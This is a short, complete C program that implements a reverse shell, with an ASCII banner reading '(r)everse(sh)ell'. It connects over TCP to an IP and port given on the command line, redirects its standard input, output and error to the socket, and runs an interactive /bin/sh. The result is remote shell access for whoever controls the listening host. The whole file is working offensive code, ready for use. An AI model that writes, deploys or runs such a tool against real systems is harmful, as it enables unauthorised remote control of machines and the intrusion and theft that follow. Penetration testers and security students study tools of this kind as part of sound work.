#include <arpa/inet.h>
#include <getopt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static void usage(char *progname)
{
    const char *banner =
        "          _       \n"
        " _ __ ___| |__    \n"
        "| '__/ __| '_ \\  \n"
        "| |  \\__ \\ | | |\n"
        "|_|  |___/_| |_|  \n"
        "(r)everse(sh)ell\n";

    fprintf(stdout, "%s\nusage: %s [-s server_ip] [-p server_port]\n", banner, progname);
}

static int parse_args(int argc, char *argv[], struct in_addr *addr, in_port_t *server_port)
{
    int opt;

    while ((opt = getopt(argc, argv, "p:s:h")) != -1) {
        switch (opt) {
        case 'p':
            *server_port = htons(atoi(optarg));
            break;

        case 's':
            inet_aton(optarg, addr);
            break;

        case 'h':
            return 1;
        }
    }

    if (!(*server_port) || !addr->s_addr)
        return 1;

    return 0;
}

static void exec_shell(int fd)
{
    char *const cmd[3] = { "/bin/sh", "-i", NULL };

    dup2(fd, STDIN_FILENO);
    dup2(fd, STDOUT_FILENO);
    dup2(fd, STDERR_FILENO);

    execv(cmd[0], cmd);
}

int main(int argc, char *argv[])
{
    struct sockaddr_in addr;
    int fd = 0;

    memset(&addr, 0, sizeof(struct sockaddr_in));

    /* Parse the server ip and port. */
    if (parse_args(argc, argv, &addr.sin_addr, &addr.sin_port)) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    addr.sin_family = AF_INET;

    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        fprintf(stderr, "[-] fail to create the communication socket!\n");
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "[+] trying to connect to server...\n");

    if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {
        fprintf(stderr, "[-] fail to connect to server!\n");
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "[+] connection estabilished...\n");

    exec_shell(fd);
}
